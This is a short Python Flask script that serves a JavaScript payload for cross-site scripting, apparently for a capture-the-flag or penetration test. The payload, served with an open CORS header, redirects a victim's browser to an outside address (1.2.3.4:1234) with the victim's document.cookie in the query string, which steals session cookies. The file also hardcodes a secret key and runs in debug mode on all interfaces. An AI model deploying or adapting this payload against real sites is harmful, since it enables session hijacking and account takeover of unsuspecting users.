#!/usr/bin/env python3
from flask import Flask, request, Response

app = Flask(__name__)
app.secret_key = "sumango3"

@app.route('/')
def main():
	data = 'location.href="http://1.2.3.4:1234?ck="+document.cookie;'
	mimetype = 'application/javascript'
	resp = Response(data, mimetype=mimetype)
	resp.headers['Access-Control-Allow-Origin'] = '*'
	return resp

if __name__ == '__main__':
	app.run(host='0.0.0.0',port=5001,debug=True)
